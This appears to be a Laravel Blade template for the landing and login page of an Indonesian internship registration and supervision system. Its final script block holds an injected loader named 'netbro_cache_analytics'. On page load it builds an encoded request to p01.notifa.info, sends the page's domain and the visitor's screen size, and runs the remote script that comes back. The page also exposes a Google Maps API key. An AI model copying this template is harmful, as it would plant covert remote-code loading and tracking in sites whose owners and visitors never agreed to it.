<!doctype html>
<html lang="en">

<!-- Mirrored from themerail.com/html/oficiona/home-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Dec 2018 03:37:28 GMT -->

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>S I P B K P</title>

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="{{asset('assets/css/bootstrap.min.css')}}">

    <!-- External Css -->
    <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/flag.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/slick.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:300i,400,500" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="{{asset('images/aknela.png')}}">
    <link rel="apple-touch-icon" href="{{asset('images/aknela57x57.png')}}">
    <link rel="apple-touch-icon" sizes="72x72" href="{{asset('images/aknela72x72.png')}}">
    <link rel="apple-touch-icon" sizes="114x114" href="{{asset('images/aknela114x114.png')}}">

    <!--[if lt IE 9]>
    <script src="assets/js/html5shiv.min.js"></script>
    <script src="assets/js/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <!-- Header -->
    <header>
        <nav class="navbar navbar-expand-xl absolute-nav transparent-nav cp-nav navbar-light bg-light fluid-nav">
            <a class="navbar-brand" href="index.html">
                <img src="images/" class="img-fluid" alt="">
            </a>
            <button class="navbar-toggler collapsed" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
                aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
        </nav>
    <!-- Banner -->
    <div class="banner banner-1 banner-1-bg">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="banner-content">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Banner End -->

    <!-- Search and Filter -->

    <div class="container">
        <div class="row">
            <div class="col">
                <div class="searchAndFilter">
                    <h3 class="text-center">Selamat Datang</h3>
                    <br>
                    <table class="table" style="border-top: 4px solid #17a2b8">
                        <tbody>
                            <tr>
                                <th>
                                    <img src="images/logo1.png" class="img-fluid" alt="" style="width:250px;height:250px;">
                                </th>
                                <th>

                                    <br>
                                    <p>Sistem Informasi Pendaftaran Dan Bimbingan Kerja Praktek Di Akademi Komunitas
                                        Negeri Lamongan</p>
                                    <ol>
                                        <li>Home</li>
                                        <li>Pendaftaran</li>
                                        <li>Bimbingan</li>
                                        <li>History Kerja Praktek</li>
                                    </ol>
                                </th>
                            </tr>
                        </tbody>
                    </table>

                    <div style="text-align: center">
                        <a href="{{url('admin')}}" class="btn btn-outline-primary btn-lg" style="padding: 10px">Login Admin</a>
                        <a href="{{url('koordinator')}}" class="btn btn-outline-primary btn-lg" style="padding: 10px">Login Koordinator</a>
                        <a href="{{url('dosen')}}" class="btn btn-outline-primary btn-lg" style="padding: 10px">Login Dosen</a>
                        <a href="{{url('pembimbing')}}" class="btn btn-outline-primary btn-lg" style="padding: 10px">Login Pembimbing</a>
                        <a href="{{url('mahasiswa')}}" class="btn btn-outline-primary btn-lg" style="padding: 10px">Login Mahasiswa</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Search and Filter End -->
    <!-- Top Companies -->
    <!-- Registration Box End -->
    <!-- Modal -->
    <div class="account-entry">
        <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-hidden="true">
            <div class="modal-dialog" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title"><i data-feather="user"></i>Login S I P B K P</h5>
                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                            <span aria-hidden="true">&times;</span>
                        </button>
                    </div>
                    <div class="modal-body">
                        @if (session('status'))
                        <div class="alert alert-danger">
                            {{ session('status') }}
                        </div>
                        @endif
                        <form action="/login" method="post">
                            @csrf
                            <div class="form-group">
                                <input type="username" placeholder="Username" class="form-control" name="username">
                            </div>
                            <div class="form-group">
                                <input type="password" placeholder="Password" class="form-control" name="password">
                            </div>
                            <button class="button primary-bg btn-block">Login</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- Testimonial -->
    <!-- Testimonial End -->
    <!-- NewsLetter -->
    <!-- NewsLetter End -->

    <!-- Footer -->
    <div class="footer-bottom-area" style="margin-top: -100px; background-color: #007bff; border-top: 4px solid #17a2b8">
        <div class="container">
            <div class="row">
                <div class="col">
                    <div class="footer-bottom">
                        <div class="row">
                            <div class="col-xl-4 col-lg-5 order-lg-2">
                                {{-- <div class="footer-app-download">
                                </div> --}}
                            </div>
                            <div class="col-xl-4 col-lg-4 order-lg-1">
                                <p style="color: #fff;"> &copy; Copyright : Elva Hidayatul Haque</p>
                            </div>
                            <div class="col-xl-4 col-lg-3 order-lg-3">
                                <div class="back-to-top">
                                    <a href="#" style="color: #fff;">Back to top<i class="fas fa-angle-up"></i></a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    </footer>
    <!-- Footer End -->
    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="{{asset('assets/js/jquery.min.js')}}"></script>
    <script src="{{asset('assets/js/popper.min.js')}}"></script>
    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('assets/js/feather.min.js')}}"></script>
    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
    <script src="{{asset('assets/js/visible.js')}}"></script>
    <script src="{{asset('assets/js/jquery.countTo.js')}}"></script>
    <script src="{{asset('assets/js/chart.js')}}"></script>
    <script src="{{asset('assets/js/plyr.js')}}"></script>
    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
    <script src="{{asset('assets/js/slick.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>

    <script src="{{asset('js/custom.js')}}"></script>

    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyC87gjXWLqrHuLKR0CTV5jNLdP4pEHMhmg"></script>
    <script src="{{asset('js/map.js')}}"></script>
    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bd71TrJ%2f7jfQ8Doz30tqfIsg%2fy%2fHbA8IkcLdQ9QMajG%2frndYoRzeALCh%2bjDzhLcGzA5varDCdSYt1kqvzuhqO7MN0XewAJBubH005oFwkza6x9bSakZbxLyVJvXvGLPPlLLmveIQREto8Ob1G7FahQwbWTZMLf0w2laqH%2bRLOJZaXYXcSGJCjnu7iEkwdMOCLyuUtN65iCiRMxfEqzoW6ny9N8iUIuga%2brC%2fkVK9Ic%2bxm29u9oFnocQXCjKey1AJxiAxbs88EFqEiQnehlBSdUE1sWb2eBGn65%2bubD3QTTAC3dUzCLyy1NWoSApROcaslrhZHNFQSr89%2fZkRakzupRiBK9K3sFdS97x2P2yahP7RDNjzNkmDoSn7upMVm%2baDKDT74M5d%2baIqb3ARurKrMD3xmXeHYgKGUp2ow0sdubX0W%2bRRmEEDDLJP4ppuN8B0SIMBW27kIpQj3SYrBsM0P2V0Mswj6PpnrvhKEBSMukyy4%3d" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };

    </script>
    @yield('script')
</header>
</body>
<!-- Mirrored from themerail.com/html/oficiona/home-1.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 26 Dec 2018 03:43:19 GMT -->
</html>
